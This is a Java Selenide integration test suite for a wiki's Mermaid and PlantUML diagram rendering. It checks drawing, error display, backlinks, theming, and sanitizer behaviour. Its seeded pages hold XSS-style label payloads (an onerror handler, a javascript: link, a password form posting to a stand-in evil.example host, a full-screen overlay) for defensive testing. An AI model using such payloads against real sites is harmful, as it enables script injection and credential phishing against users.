/*
    Licensed to the Apache Software Foundation (ASF) under one
    or more contributor license agreements.  See the NOTICE file
    distributed with this work for additional information
    regarding copyright ownership.  The ASF licenses this file
    to you under the Apache License, Version 2.0 (the
    "License"); you may not use this file except in compliance
    with the License.  You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing,
    software distributed under the License is distributed on an
    "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
    KIND, either express or implied.  See the License for the
    specific language governing permissions and limitations
    under the License.
 */
package com.wikantik.its;

import com.codeborne.selenide.CollectionCondition;
import com.codeborne.selenide.Condition;
import com.codeborne.selenide.Selenide;
import com.codeborne.selenide.SelenideElement;
import com.codeborne.selenide.WebDriverRunner;
import com.wikantik.pages.spa.EditWikiPage;
import com.wikantik.pages.spa.ViewWikiPage;
import com.wikantik.its.environment.Env;
import org.junit.jupiter.api.AfterAll;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.Test;
import org.openqa.selenium.By;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;

import static com.codeborne.selenide.Selenide.$;
import static com.codeborne.selenide.Selenide.$$;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Browser coverage for rendered fences: a Mermaid diagram is drawn as SVG in the real SPA, an {@code example}
 * fence stays code, a broken diagram shows an error with the source kept, a diagram {@code click} link navigates
 * and counts as a backlink, the server HTML carries the escaped source with JS off, and Mermaid's sanitizer
 * strips handlers, forms and inline styles from labels.
 */
public class RenderedFencesIT extends WithIntegrationTestSetup {

    private static final Duration WAIT = Duration.ofSeconds( 30 );
    private static final long TS = System.currentTimeMillis();
    private static final String TARGET = "FenceTarget" + TS;
    private static final String SOURCE = "FenceSource" + TS;
    private static final String HANDLER = "FenceHandler" + TS;
    private static final String JSLINK = "FenceJsLink" + TS;
    private static final String FORM = "FenceForm" + TS;
    private static final String PUML = "FencePuml" + TS;
    private static final String PUML_BAD = "FencePumlBad" + TS;
    private static final String WIDE = "FenceWide" + TS;

    @BeforeAll
    static void seed() throws Exception {
        RestSeedHelper.writePage( TARGET, "# " + TARGET + "\n\nThe diagram link target.\n" );
        RestSeedHelper.writePage( SOURCE, "# " + SOURCE + "\n\n"
            + "```mermaid\nflowchart LR\n  A[Start] --> B[End]\n  click A \"/wiki/" + TARGET + "\"\n```\n\n"
            + "```mermaid example\nflowchart LR\n  X --> Y\n```\n\n"
            + "```mermaid\nthis is definitely not a diagram ((\n```\n" );
        RestSeedHelper.writePage( HANDLER, "# " + HANDLER + "\n\n"
            + "```mermaid\nflowchart LR\n  A[\"<img src=x onerror=alert(1)>\"] --> B[End]\n```\n" );
        RestSeedHelper.writePage( FORM, "# " + FORM + "\n\n"
            + "```mermaid\nflowchart LR\n"
            + "  A[\"<form action='https://evil.example/x'><input type='password'><textarea>t</textarea>"
            + "<select><option>o</option></select><button>Go</button></form>\"]"
            + " --> B[\"<span style='position:fixed;inset:0;z-index:99999'>Overlay</span>\"]\n```\n" );
        RestSeedHelper.writePage( JSLINK, "# " + JSLINK + "\n\n"
            + "```mermaid\nflowchart LR\n  A[\"<a href='javascript:alert(1)'>x</a>\"] --> B[End]\n```\n" );
        RestSeedHelper.writePage( PUML, "# " + PUML + "\n\n"
            + "```plantuml\n@startuml\nclass Order {\n  +id: int\n}\nclass Customer\nCustomer --> Order\n@enduml\n```\n\n"
            + "```plantuml\n@startuml\nstart\nfork\n  :a;\nfork again\n  :b;\nend fork\nstop\n@enduml\n```\n" );
        RestSeedHelper.writePage( PUML_BAD, "# " + PUML_BAD + "\n\n"
            + "```plantuml\n@startuml\n!include x\nA -> B\n@enduml\n```\n" );
        final StringBuilder wide = new StringBuilder( "flowchart LR\n  N0[Node number zero]" );
        for ( int i = 1; i < 24; i++ ) {
            wide.append( " --> N" ).append( i ).append( "[Node number " ).append( i ).append( ']' );
        }
        RestSeedHelper.writePage( WIDE, "# " + WIDE + "\n\n```mermaid\n" + wide + "\n```\n" );
    }

    @AfterAll
    static void cleanUp() {
        for ( final String n : new String[] { PUML, PUML_BAD, WIDE, SOURCE, HANDLER, JSLINK, FORM, TARGET } ) {
            RestSeedHelper.deletePageQuietly( n );
        }
    }

    @Test
    void diagramDrawsAsSvg() {
        ViewWikiPage.open( SOURCE );
        $( "figure.wk-fence[data-fence-state=drawn] svg" ).shouldBe( Condition.exist, WAIT );
        // The drawn diagram hides its source (display:none), so read textContent rather than visible text.
        $( "figure.wk-fence[data-fence-state=drawn] .wk-fence-source code" )
            .shouldHave( Condition.attributeMatching( "textContent", "(?s).*flowchart.*" ), WAIT );
    }

    @Test
    void exampleFenceStaysCode() {
        ViewWikiPage.open( SOURCE );
        $( By.xpath( "//pre[not(ancestor::figure[contains(@class,'wk-fence')])]"
            + "/code[contains(@class,'language-mermaid')]" ) ).shouldBe( Condition.visible, WAIT );
    }

    @Test
    void brokenDiagramShowsError() {
        ViewWikiPage.open( SOURCE );
        $( "figure.wk-fence[data-fence-state=failed] .wk-fence-error" ).shouldBe( Condition.visible, WAIT );
        $( "figure.wk-fence[data-fence-state=failed] .wk-fence-source code" )
            .shouldHave( Condition.attributeMatching( "textContent", "(?s).*not a diagram.*" ), WAIT );
    }

    @Test
    void diagramLinkNavigates() {
        ViewWikiPage.open( SOURCE );
        $( "figure.wk-fence[data-fence-state=drawn] svg a" ).shouldBe( Condition.exist, WAIT );
        Selenide.executeJavaScript(
            "const a = document.querySelector('figure.wk-fence[data-fence-state=drawn] svg a');"
            + "a.dispatchEvent(new MouseEvent('click', {bubbles: true, cancelable: true, view: window}));" );
        Selenide.Wait().withTimeout( WAIT ).until(
            d -> WebDriverRunner.url().endsWith( "/wiki/" + TARGET ) );
        assertTrue( WebDriverRunner.url().endsWith( "/wiki/" + TARGET ), WebDriverRunner.url() );
    }

    @Test
    void diagramLinkCountsAsBacklink() {
        ViewWikiPage.open( TARGET );
        boolean found = false;
        for ( int attempt = 0; attempt < 10 && !found; attempt++ ) {
            found = $( "[data-testid=backlinks-panel]" ).exists()
                 && $( "[data-testid=backlinks-panel]" ).$( By.linkText( SOURCE ) ).exists();
            if ( !found ) {
                Selenide.sleep( 500 );
                Selenide.refresh();
                $( "[data-testid=page-view]" ).shouldBe( Condition.visible, Duration.ofSeconds( 10 ) );
            }
        }
        $( "[data-testid=backlinks-panel]" ).shouldBe( Condition.visible, WAIT )
            .$( By.linkText( SOURCE ) ).shouldBe( Condition.visible, WAIT );
    }

    @Test
    void ssrHtmlCarriesSource() throws Exception {
        final HttpResponse< String > resp = HttpClient.newHttpClient().send(
            HttpRequest.newBuilder( URI.create( Env.TESTS_BASE_URL + "/wiki/" + SOURCE ) ).GET().build(),
            HttpResponse.BodyHandlers.ofString() );
        assertEquals( 200, resp.statusCode() );
        assertTrue( resp.body().contains( "wk-fence" ), "server HTML must carry the fence envelope" );
        assertTrue( resp.body().contains( "flowchart LR" ), "server HTML must carry the source" );
        assertTrue( resp.body().contains( "A[Start] --&gt; B[End]" ), "source must be HTML-escaped" );
    }

    @Test
    void diagramLabelCannotInjectHandlers() {
        ViewWikiPage.open( HANDLER );
        $( "figure.wk-fence[data-fence-state=drawn] svg" ).shouldBe( Condition.exist, WAIT );
        final Object unsafe = Selenide.executeJavaScript(
            "const svg = document.querySelector('figure.wk-fence[data-fence-state=drawn] svg');"
            + "return [svg, ...svg.querySelectorAll('*')].some(el => [...el.attributes].some(a =>"
            + " /^on/i.test(a.name) || /^\\s*javascript:/i.test(a.value)));" );
        assertEquals( Boolean.FALSE, unsafe, "drawn SVG must carry no on* attribute or javascript: URL" );
    }

    @Test
    void diagramLabelCannotCarryFormsOrInlineStyles() {
        ViewWikiPage.open( FORM );
        $( "figure.wk-fence[data-fence-state=drawn] svg" ).shouldBe( Condition.exist, WAIT );
        final Object forms = Selenide.executeJavaScript(
            "return document.querySelectorAll('figure.wk-fence[data-fence-state=drawn] svg"
            + " :is(form, input, button, textarea, select, option)').length;" );
        assertEquals( 0L, ( ( Number ) forms ).longValue(), "drawn SVG must hold no form or form control" );
        // Mermaid styles its own label wrappers; only an author-supplied style would carry these properties.
        final Object styled = Selenide.executeJavaScript(
            "return [...document.querySelectorAll('figure.wk-fence[data-fence-state=drawn] svg [style]')]"
            + ".some(el => /position\\s*:\\s*fixed|z-index/i.test(el.getAttribute('style')));" );
        assertEquals( Boolean.FALSE, styled, "label HTML must carry no author-supplied inline style" );
        // The label text itself survives: the sanitizer drops the tags, not the diagram.
        final Object text = Selenide.executeJavaScript(
            "return document.querySelector('figure.wk-fence[data-fence-state=drawn] svg').textContent;" );
        assertTrue( String.valueOf( text ).contains( "Overlay" ), "label text survives: " + text );
    }

    @Test
    void javascriptLinkInLabelIsRefused() {
        ViewWikiPage.open( JSLINK );
        $( "figure.wk-fence[data-fence-state=refused]" ).shouldBe( Condition.exist, WAIT );
        $( "figure.wk-fence[data-fence-state=refused] svg" ).shouldNot( Condition.exist );
    }

    private static final String PUML_FIGURE = "figure.wk-fence[data-fence=plantuml][data-fence-state=drawn]";

    @Test
    void plantumlClassAndActivityDrawInReader() {
        ViewWikiPage.open( PUML );
        $$( PUML_FIGURE + " .wk-fence-variant[data-variant=light] svg" ).shouldHave( CollectionCondition.size( 2 ), WAIT );
        $( PUML_FIGURE + " .wk-fence-toolbar [data-action=source]" ).shouldBe( Condition.visible, WAIT )
            .shouldHave( Condition.text( "Show source" ) );
    }

    @Test
    void plantumlDarkVariantShownInDarkTheme() {
        ViewWikiPage.open( PUML );
        final SelenideElement light = $( PUML_FIGURE + " .wk-fence-variant[data-variant=light]" );
        final SelenideElement dark = $( PUML_FIGURE + " .wk-fence-variant[data-variant=dark]" );
        light.shouldBe( Condition.visible, WAIT );
        dark.shouldNotBe( Condition.visible );
        Selenide.executeJavaScript( "document.documentElement.setAttribute('data-theme','dark')" );
        dark.shouldBe( Condition.visible, WAIT );
        light.shouldNotBe( Condition.visible, WAIT );
    }

    @Test
    void plantumlPreviewDrawsInEditor() {
        Selenide.closeWebDriver();
        ViewWikiPage.open( "Main" )
            .clickOnLogin()
            .performLogin( Env.LOGIN_JANNE_USERNAME, Env.LOGIN_JANNE_PASSWORD );
        EditWikiPage.open( PUML );
        $( ".editor-preview figure.wk-fence[data-fence=plantuml][data-fence-state=drawn]"
            + " .wk-fence-variant[data-variant=light] svg" )
            .shouldBe( Condition.visible, Duration.ofSeconds( 60 ) );
    }

    @Test
    void plantumlRefusalShowsReason() {
        ViewWikiPage.open( PUML_BAD );
        final SelenideElement fig = $( "figure.wk-fence[data-fence-error=include]" );
        fig.shouldBe( Condition.exist, WAIT );
        fig.$( ".wk-fence-error" ).shouldBe( Condition.visible, WAIT )
            .shouldHave( Condition.text( "it includes another file or URL." ), WAIT );
        fig.$( ".wk-fence-source" ).shouldBe( Condition.visible, WAIT );
    }

    @Test
    void mermaidExpandDialogKeepsStyles() {
        final org.openqa.selenium.Dimension original = WebDriverRunner.getWebDriver().manage().window().getSize();
        try {
            expandDialogKeepsStyles();
        } finally {
            WebDriverRunner.getWebDriver().manage().window().setSize( original );
        }
    }

    private void expandDialogKeepsStyles() {
        // A narrow window makes the wide diagram scale down regardless of the runner's default size.
        WebDriverRunner.getWebDriver().manage().window().setSize( new org.openqa.selenium.Dimension( 700, 900 ) );
        ViewWikiPage.open( WIDE );
        $( "figure.wk-fence[data-fence-state=drawn] svg" ).shouldBe( Condition.exist, WAIT );
        final SelenideElement expand = $( "figure.wk-fence[data-fence-state=drawn] .wk-fence-toolbar [data-action=expand]" );
        expand.shouldBe( Condition.visible, WAIT );
        expand.click();
        $( "dialog.wk-fence-dialog" ).shouldBe( Condition.visible, WAIT );
        final Object ok = Selenide.executeJavaScript(
            "const svg = document.querySelector('dialog.wk-fence-dialog svg');"
            + "const css = [...svg.querySelectorAll('style')].map(s => s.textContent).join('\\n');"
            + "const refs = [...css.matchAll(/#([A-Za-z_][\\w-]*)/g)].map(m => m[1])"
            + ".filter(id => !/^[0-9a-f]{3,8}$/i.test(id));"
            + "if (refs.length === 0) return false;"
            + "return refs.every(id => svg.id === id || svg.querySelector('[id=\"' + id + '\"]'));" );
        assertEquals( Boolean.TRUE, ok, "every #id in the clone's <style> must exist in the clone" );
    }
}
